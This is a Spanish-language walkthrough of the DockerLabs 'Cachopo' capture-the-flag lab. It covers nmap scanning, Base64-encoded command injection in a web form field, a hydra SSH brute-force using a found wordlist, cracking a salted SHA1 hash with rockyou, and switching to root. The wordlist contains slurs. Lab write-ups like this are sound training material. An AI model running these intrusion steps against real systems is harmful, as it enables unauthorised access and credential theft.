---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cachopo DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip cachopo.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh cachopo.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 10:25 EST
Nmap scan report for spainmerides.dl (172.17.0.2)
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7b:98:d4:e7:ec:50:0b:b2:3a:21:76:2c:45:95:23:61 (ECDSA)
|_  256 5d:15:2b:28:ec:67:7e:78:3c:16:12:65:2f:59:d4:88 (ED25519)
80/tcp open  http    Werkzeug/3.0.3 Python/3.12.3
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 11 Jan 2025 15:25:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 9332
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width initial-scale=1.0">
|     <link rel="stylesheet" href="/static/css/style.css">
|     <title>Cahopos4-4ll</title>
|     </head>
|     <header>
|     <nav>
|     <h2><a href="/" id="logo">DockerLabs</a></h2>
|     <button class="nav-button fa fa-bars"></button>
|     <div>
|     <!-- <ul> -->
|     <ul>
|     <button class="exit-menu fa fa-times"></button>
|     <li><a href="#" class="active">welcome</a></li>
|     <li><a href="#">menu</a></li>
|     <li><a href="#">reservations</a></li>
|     <li><a href="#">news</a></li>
|     <li><a href="#">contact</a></li>
|     </ul>
|     <!-- </ul> -->
|     </div>
|     </nav>
|     <div cl
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 11 Jan 2025 15:25:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: Cahopos4-4ll
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=1/11%Time=67828D7C%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,2523,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\x
SF:20Python/3\.12\.3\r\nDate:\x20Sat,\x2011\x20Jan\x202025\x2015:25:48\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x209332\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20
SF:\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x
SF:20<meta\x20name=\"viewport\"\x20content=\"width=device-width\x20initial
SF:-scale=1\.0\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:static/css/style\.css\">\n\x20\x20\x20\x20<title>Cahopos4-4ll</title>\n
SF:\x20\x20</head>\n<header>\n\x20\x20<nav>\n\x20\x20\x20\x20<h2><a\x20hre
SF:f=\"/\"\x20id=\"logo\">DockerLabs</a></h2>\n\x20\x20\x20\x20<button\x20
SF:class=\"nav-button\x20fa\x20fa-bars\"></button>\n\x20\x20\x20\x20<div>\
SF:n<!--\x20\x20\x20\x20\x20<ul>\x20-->\n\x20\x20\x20\x20\x20\x20<ul>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<button\x20class=\"exit-menu\x20fa\x20fa-t
SF:imes\"></button>\n\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\"#\"\
SF:x20class=\"active\">welcome</a></li>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:li><a\x20href=\"#\">menu</a></li>\n\x20\x20\x20\x20\x20\x20\x20\x20<li>
SF:<a\x20href=\"#\">reservations</a></li>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<li><a\x20href=\"#\">news</a></li>\n\x20\x20\x20\x20\x20\x20\x20\x20<l
SF:i><a\x20href=\"#\">contact</a></li>\n\x20\x20\x20\x20\x20\x20</ul>\n<!-
SF:-\x20\x20\x20\x20\x20</ul>\x20-->\n\x20\x20\x20\x20</div>\n\x20\x20</na
SF:v>\n\x20\x20<div\x20cl")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\nSe
SF:rver:\x20Werkzeug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2011\x20
SF:Jan\x202025\x2015:25:48\x20GMT\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x200\r
SF:\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\
SF:n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\
SF:x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('R
SF:TSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20
SF:explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupport
SF:ed\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.79 seconds
```

Si entramos en el puerto `80` veremos una pagina normal por fuera, si probamos a interceptar la peticion con `BurpSuite` enviando esto de la pagina:

<figure><img src="../../.gitbook/assets/image (153) (1).png" alt=""><figcaption></figcaption></figure>

Y en `BurpSuite` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (154) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a probar si el `userInput` es vulnerable por alguna injeccion de comandos.

Pero antes lo mandaremos al `Repeater` y ahi lo testearemos.

<figure><img src="../../.gitbook/assets/image (155) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que con un `ls` nos da un error bastante interesante el cual parece ser que no admite ese comando asi a pelo, pero tampoco nos da otro error de peticion en el sentido de que no signifique nada para el servidor, por lo que probaremos a codificarlo en `Base64` para ver si se lo traga.

<figure><img src="../../.gitbook/assets/image (156) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que si nos esta haciendo un `ls` pero codificado en `Base64` por lo que haremos lo siguiente:

Primero vemos que usuarios somos:

<figure><img src="../../.gitbook/assets/image (157) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que somos el usuario `cachopin`.

Si listamos los archivos que ha creado dicho usuario, veremos que en la `home` del usuario hay varios archivos interesantes:

```shell
find / -type f -user cachopin 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (158) (1).png" alt=""><figcaption></figcaption></figure>

Los 2 archivos interesantes son:

```
/home/cachopin/app/com/personal/hash.lst
/home/cachopin/newsletters/client_list.txt
```

Vamos a leer estos dos archivos:

> hash.lst

<figure><img src="../../.gitbook/assets/image (159) (1).png" alt=""><figcaption></figcaption></figure>

```
$SHA1$d$GkLrWsB7LfJz1tqHBiPzuvM5yFb=
$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=
$SHA1$d$NxJmRtB6LpHs9vJYpQkErzU8wAv=
$SHA1$d$BvKpTbC5LcJs4gRzQfLmHxM7yEs=
$SHA1$d$LxVnWkB8JdGq2rH0UjPzKvT5wM1=
```

> client\_list.txt

Parece que es una lista de usuarios del sistema.

<figure><img src="../../.gitbook/assets/image (160) (1).png" alt=""><figcaption></figcaption></figure>

```
dreamer
darkness
cecilia
lollypop
nicolas
google
lindsay
cooper
passion
kristine
green
puppies
ariana
fuckme
chubby
raquel
lonely
anderson
sammie
sexybitch
mario
butter
willow
roxana
mememe
caroline
susana
kristen
baller
hotstuff
carter
stacey
babylove
angelina
miller
scorpion
sierra
playgirl
sweet16
012345
rocker
bhebhe
gustavo
marcos
chance
simple
123qwe
kayla
james1
bettyboo
babymama
babyboo1
Elizabeth
998877
wright
wilmer
tesoro
shine
palmer
natnat
marias
lovebird
lalaine
john123
jarrod
jackjack
honney
greens
faggot
denmark
degrassi
clarisse
chispita
buckfast
bookworm
shotgun
perez
moose
money123
lonely1
ilovejamie
hottie2
henry1
guadalajara
bebeko
333666
someday
quicksilver
pizzahut
pedrito
moonstar
masina
maniac
lovealways
july14
ilovejack
ilovedanny
```

## Hydra

Si esta lista anterior la utilizamos como diccionario de contraseñas con el usuario `cachopin` y le tiramos un `hydra` veremos lo siguiente:

```shell
hydra -l cachopin -P client_list.txt ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-11 11:06:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 97 login tries (l:1/p:97), ~2 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: cachopin   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 19 final worker threads did not complete until end.
[ERROR] 19 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-11 11:06:46
```

Vemos que nos descubrio las credenciales del usuario `cachopin`, por lo que nos conectaremos por `SSH`.

## SSH

```shell
ssh cachopin@<IP>
```

Metemos como contraseña `simple` y veremos que estamos dentro.

## Escalate Privileges

Si vemos el archivo `entrypoint.sh`:

```shell
#!/bin/bash

# Inicia el servicio SSH como root
service ssh start

# Cambia al usuario cachopin para ejecutar la aplicación Flask
exec su - cachopin -c "/home/cachopin/venv/bin/python /home/cachopin/app/app.py"
```

Vemos que es bastante raro y en el cual posiblemente podremos escalar privilegios por ahi, pero vamos a intentar crackear lo siguiente.

Anteriormente encontramos un listado de `hashes` los cuales vemos que esta en `SHA1` por lo que vamos a intentar decodificarlo con un script de un repositorio de `GitHub`.

URL = [Decoder SHA1 GitHub](https://github.com/PatxaSec/SHA_Decrypt/blob/main/sha2text.py)

Vamos a ir a nuestro `host` y vamos a probar cada uno de los `hashes` por separado y veremos lo siguiente:

```shell
python3 decoder.py 'd' '$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=' '/usr/share/wordlists/rockyou.txt'
```

Info:

```
Processing:   7%|██████▌                                                                                       | 992816/14344392 [00:03<00:40, 327669.84it/s]

 [+] Pwnd !!! $SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=::::cecina
```

Vemos que hemos encontrado de todos los hashes uno que hemos podido decodificar.

Si probamos la contraseña `cecina` con el usuario `root` podremos ver que es la suya.

```shell
su root
```

Metemos como contraseña `cecina` y veremos que ya seremos `root`.
